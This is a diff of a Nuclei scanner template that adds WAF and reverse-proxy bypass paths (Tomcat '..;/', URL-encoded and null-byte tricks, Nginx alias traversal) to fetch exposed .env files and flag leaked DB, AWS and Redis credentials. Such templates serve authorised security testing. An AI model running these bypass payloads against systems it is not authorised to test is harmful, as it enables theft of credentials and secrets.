@@ -1,24 +1,31 @@
 id: ghost-env-hunter
 
 info:
-  name: Deep Environment Backup Exposure
+  name: Deep Environment Backup Exposure (Proxy Bypass Edition)
   author: Sniper-Predator
   severity: high
-  description: Mengintai file konfigurasi dan backup yang luput dari template publik dan WAF.
-  tags: exposure,config,backup,custom
+  description: Mengintai file konfigurasi dengan teknik WAF/Reverse Proxy Bypass.
+  tags: exposure,config,backup,bypass,custom
 
 requests:
   - method: GET
     path:
+      # Standard Paths
+      - "{{BaseURL}}/.env"
       - "{{BaseURL}}/.env.staging"
-      - "{{BaseURL}}/.env.local"
       - "{{BaseURL}}/.env.backup"
-      - "{{BaseURL}}/.env.dev"
-      - "{{BaseURL}}/api/.env"
-      - "{{BaseURL}}/config/.env"
-      - "{{BaseURL}}/.env.old"
-      - "{{BaseURL}}/docker-compose.yml"
-      - "{{BaseURL}}/backup.sql.gz"
+      # Tomcat/Spring Proxy Bypasses (Goldmine untuk Tier-1)
+      - "{{BaseURL}}/api/..;/.env"
+      - "{{BaseURL}}/%2e/.env"
+      - "{{BaseURL}}/.env%00"
+      - "{{BaseURL}}/%20/.env"
+      - "{{BaseURL}}//.env"
+      - "{{BaseURL}}/./.env"
+      - "{{BaseURL}}/%ef%bc%8f.env"
+      # Nginx Alias Misconfigurations
+      - "{{BaseURL}}/assets/..%2f.env"
+      - "{{BaseURL}}/static/..%2f.env"
+      - "{{BaseURL}}/public/..%2f..%2f.env"
 
     headers:
       Cache-Control: "max-age=0"
@@ -35,8 +42,9 @@ requests:
           - "DB_PASSWORD="
           - "AWS_ACCESS_KEY_ID="
           - "APP_ENV="
+          - "REDIS_PASSWORD="
         condition: or
-      # ANTI-HTML TRAP: Mencegah WAF / Catch-All membohongi Nuclei
+      # ANTI-HTML TRAP
       - type: word
         words:
           - "<html"
